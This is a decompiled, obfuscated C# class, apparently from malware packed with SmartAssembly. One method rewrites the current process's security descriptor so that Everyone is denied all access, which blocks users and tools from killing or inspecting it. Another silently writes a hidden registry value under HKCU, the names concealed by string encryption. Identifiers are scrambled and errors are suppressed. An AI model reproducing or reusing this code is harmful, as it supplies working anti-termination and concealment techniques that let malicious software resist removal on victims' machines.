using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace bfaErnBXmrcm;

internal sealed class wbfXxxnAowD
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr bQADpVMilbCRbN, int WXafvDESDQqrCZMH, [Out] byte[] aBQzGWWYHFfrxbA, uint fhjPlhEHzAg, out uint eTIjpnOwtmkWkR);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr LeMRtzLcnDccC, int UqHVJhspBNxOEqRvK, [In] byte[] QuCzZgVjlVBb);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void drXNUhHOJcEUXTm(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107370613)));
			registryKey.SetValue(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107370508)), getString_0(107395813));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor BFyqncWZojomWA(IntPtr intptr_0)
	{
		byte[] aBQzGWWYHFfrxbA = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, aBQzGWWYHFfrxbA, 0u, out var eTIjpnOwtmkWkR);
		if ((long)eTIjpnOwtmkWkR > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, aBQzGWWYHFfrxbA = new byte[eTIjpnOwtmkWkR], eTIjpnOwtmkWkR, out eTIjpnOwtmkWkR))
		{
			return null;
		}
		return new RawSecurityDescriptor(aBQzGWWYHFfrxbA, 0);
	}

	private void tYqhYvpavwIU(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void IpLnuAJyOxDi()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = BFyqncWZojomWA(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			tYqhYvpavwIU(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static wbfXxxnAowD()
	{
		Strings.CreateGetStringDelegate(typeof(wbfXxxnAowD));
	}
}
